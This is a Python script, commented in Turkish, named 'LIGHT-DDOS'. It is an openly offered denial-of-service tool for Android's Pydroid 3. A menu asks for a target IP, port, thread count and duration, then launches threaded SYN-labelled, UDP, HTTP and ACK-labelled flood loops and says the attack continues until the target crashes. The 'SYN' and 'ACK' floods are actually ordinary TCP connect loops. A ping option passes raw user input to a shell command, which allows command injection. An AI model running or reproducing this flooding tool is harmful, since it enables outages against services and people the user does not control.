# ================================================================
# LIGHT-DDOS - Pydroid 3 için DDoS Aracı (SYN + UDP + HTTP)
# Python ile tamamen yeniden yazıldı - Bash bağımlılığı yok
# ================================================================

import os
import time
import random
import threading
import socket
import requests
from concurrent.futures import ThreadPoolExecutor

# Kesin ve net ANSI renk kodları
KIRMIZI = "\033[1;31m"
BEYAZ = "\033[1;37m"
GREEN = "\033[0;32m"
BOLD_GREEN = "\033[1;32m"
BOLD_BLACK = "\033[1;30m"
SIFIRLA = "\033[0m"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# ================================================================
# BANNER (Kalın, kırılma ve yamulma yapmayan blok tasarım)
# ================================================================

def print_banner():
    print(f"{KIRMIZI}██╗     ██╗ ██████╗ ██╗  ██╗████████╗{SIFIRLA}")
    print(f"{KIRMIZI}██║     ██║██╔════╝ ██║  ██║╚══██╔══╝{SIFIRLA}")
    print(f"{KIRMIZI}██║     ██║██║  ███╗███████║   ██║   {SIFIRLA}")
    print(f"{KIRMIZI}██║     ██║██║   ██║██╔══██║   ██║   {SIFIRLA}")
    print(f"{KIRMIZI}███████╗██║╚██████╔╝██║  ██║   ██║   {BEYAZ}tiktok:mertbal.35{SIFIRLA}")
    print(f"{KIRMIZI}╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   {SIFIRLA}")
    print("")
    print(f"{KIRMIZI}         --- LIGHT NETWORK MENU ---{SIFIRLA}")

# ================================================================
# FLOOD FONKSİYONLARI
# ================================================================

def syn_flood(target_ip, target_port, duration):
    """SYN flood - hping3 olmadan raw socket ile"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    
    while time.time() < end_time:
        try:
            sock.connect((target_ip, int(target_port)))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
        except:
            pass
        time.sleep(0.01)

def udp_flood(target_ip, target_port, duration):
    """UDP flood - DNS ve NTP portlarına"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    
    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, int(target_port)))
        except:
            pass
        time.sleep(0.001)

def http_flood(target_ip, target_port, duration, threads):
    """HTTP keep-alive flood - çoklu bağlantı"""
    end_time = time.time() + duration
    url = f"http://{target_ip}:{target_port}/"
    headers = {
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    def _http_task():
        while time.time() < end_time:
            try:
                requests.get(url, headers=headers, timeout=1, params={"r": random.randint(1,999999)})
            except:
                pass
            time.sleep(0.001)
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(_http_task)

def ack_flood(target_ip, target_port, duration):
    """ACK flood - TCP ACK paketleri"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    
    while time.time() < end_time:
        try:
            sock.connect((target_ip, int(target_port)))
            sock.send(b"ACK" * 1024)
            sock.close()
        except:
            pass
        time.sleep(0.01)

# ================================================================
# ANA DDoS FONKSİYONU
# ================================================================

def ddos_attack(target_ip, target_port, threads, duration):
    print(f"\n{KIRMIZI}[+] REAL INTERNET DDOS BAŞLATILIYOR{SIFIRLA}")
    print(f"{KIRMIZI}Hedef: {target_ip}:{target_port} | Thread: {threads} | Süre: {duration}s{SIFIRLA}")
    print(f"{BOLD_BLACK}[!] Bu saldırı gerçek trafik üretir - hedef çökene kadar devam eder.{SIFIRLA}")
    
    # 4 katmanlı saldırıyı başlat
    threads_list = []
    
    for i in range(threads // 4):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
        threads_list.append(t)
        t.daemon = True
        t.start()
    
    for i in range(threads // 4):
        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        threads_list.append(t)
        t.daemon = True
        t.start()
    
    for i in range(threads // 2):
        t = threading.Thread(target=http_flood, args=(target_ip, target_port, duration, 10))
        threads_list.append(t)
        t.daemon = True
        t.start()
    
    for i in range(threads // 4):
        t = threading.Thread(target=ack_flood, args=(target_ip, target_port, duration))
        threads_list.append(t)
        t.daemon = True
        t.start()
    
    print(f"{KIRMIZI}[+] 4 katmanlı saldırı aktif: SYN + UDP + HTTP + ACK{SIFIRLA}")
    print(f"{BOLD_BLACK}[+] Süre dolana kadar bekleniyor...{SIFIRLA}")
    
    time.sleep(duration)
    print(f"\n{KIRMIZI}[+] Saldırı tamamlandı. Hedef kontrol edin.{SIFIRLA}")

# ================================================================
# MENÜ
# ================================================================

def main():
    while True:
        clear()
        print_banner()
        print(f"{BOLD_BLACK}------------------------------------{SIFIRLA}")
        print(f"{BOLD_GREEN}[1]{SIFIRLA} Sistem Bilgisi")
        print(f"{BOLD_GREEN}[2]{SIFIRLA} Bağımlılıkları Kontrol Et (requests)")
        print(f"{BOLD_GREEN}[3]{SIFIRLA} Hakkında")
        print(f"{BOLD_GREEN}[4]{SIFIRLA} İnternet Bağlantı Testi (Ping)")
        print(f"{BOLD_GREEN}[5]{SIFIRLA} DDoS Saldırısı Başlat (SYN+UDP+HTTP+ACK)")
        print(f"{BOLD_GREEN}[0]{SIFIRLA} Çıkış")
        print(f"{BOLD_BLACK}------------------------------------{SIFIRLA}")
        
        secim = input(f"{KIRMIZI}L I G H T > {SIFIRLA}")
        
        if secim == "1":
            print(f"\n{GREEN}Pydroid 3 - Python {os.sys.version}{SIFIRLA}")
            input(f"{BOLD_BLACK}Devam etmek için Enter...{SIFIRLA}")
            
        elif secim == "2":
            print(f"\n{GREEN}requests modülü kontrol ediliyor...{SIFIRLA}")
            try:
                import requests
                print(f"{GREEN}[+] requests mevcut - Versiyon: {requests.__version__}{SIFIRLA}")
            except:
                print(f"{KIRMIZI}[-] requests yüklü değil! Pip ile kurun: pip install requests{SIFIRLA}")
            input(f"{BOLD_BLACK}Devam etmek için Enter...{SIFIRLA}")
            
        elif secim == "3":
            print(f"\n{KIRMIZI}--- LIGHT TOOL ---{SIFIRLA}")
            print(f"{KIRMIZI}Versiyon:{SIFIRLA} 4.0 (Python DDoS Edition)")
            print(f"{KIRMIZI}Açıklama:{SIFIRLA} Pydroid 3 için tamamen Python ile yazılmış DDoS aracı.")
            print(f"{KIRMIZI}Yapımcı:{SIFIRLA} mertbal.35")
            print(f"{KIRMIZI}Bağımlılık:{SIFIRLA} requests (pip install requests)")
            input(f"{BOLD_BLACK}Devam etmek için Enter...{SIFIRLA}")
            
        elif secim == "4":
            print(f"\n{KIRMIZI}[ İNTERNET BAĞLANTI TESTİ ]{SIFIRLA}")
            target = input(f"{GREEN}Test Edilecek Sunucu/IP (Örn: google.com): {SIFIRLA}")
            if not target:
                print(f"{KIRMIZI}Hata: Bir hedef belirtmelisiniz!{SIFIRLA}")
            else:
                print(f"\n{KIRMIZI}Hedef: {target} adresine paketler gönderiliyor...{SIFIRLA}")
                response = os.system(f"ping -c 4 {target}")
                if response != 0:
                    print(f"{KIRMIZI}Ping başarısız!{SIFIRLA}")
            input(f"{BOLD_BLACK}Devam etmek için Enter...{SIFIRLA}")
            
        elif secim == "5":
            print(f"\n{KIRMIZI}[ DDOS SALDIRISI ]{SIFIRLA}")
            target_ip = input(f"{GREEN}Hedef IP (sayısal, örn: 1.2.3.4): {SIFIRLA}")
            port = input(f"{GREEN}Port (örn: 80, 443): {SIFIRLA}")
            threads = input(f"{GREEN}Thread sayısı (öneri 100-300): {SIFIRLA}")
            duration = input(f"{GREEN}Süre (saniye, örn: 120): {SIFIRLA}")
            
            if not all([target_ip, port, threads, duration]):
                print(f"{KIRMIZI}Hata: Tüm alanlar doldurulmalı!{SIFIRLA}")
            else:
                try:
                    ddos_attack(target_ip, int(port), int(threads), int(duration))
                except Exception as e:
                    print(f"{KIRMIZI}Hata: {str(e)}{SIFIRLA}")
            input(f"{BOLD_BLACK}Devam etmek için Enter...{SIFIRLA}")
            
        elif secim == "0":
            print(f"\n{KIRMIZI}LIGHT Tool kapatılıyor...{SIFIRLA}")
            break
            
        else:
            print(f"\n{KIRMIZI}Geçersiz seçenek!{SIFIRLA}")
            time.sleep(1)

if __name__ == "__main__":
    main()